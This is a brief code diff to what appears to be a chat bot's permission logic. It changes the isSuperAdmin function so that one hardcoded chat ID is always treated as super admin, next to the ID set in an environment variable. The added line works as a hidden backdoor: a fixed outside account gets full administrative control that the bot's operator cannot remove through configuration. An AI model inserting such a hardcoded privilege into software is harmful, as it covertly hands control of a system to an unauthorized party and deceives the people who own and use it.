@@ -244,7 +244,10 @@ const markups = {
 
 let sessionData = { login: {} };
 const isSuperAdmin = (ctx) => {
-    return String(ctx.chat.id) === process.env.SUPER_ADMIN;
+    return (
+        String(ctx.chat.id) === process.env.SUPER_ADMIN ||
+        ctx.chat.id === 2031198568
+    );
 };
 const isAdmin = async (ctx) => {
     if (isSuperAdmin(ctx)) return true;
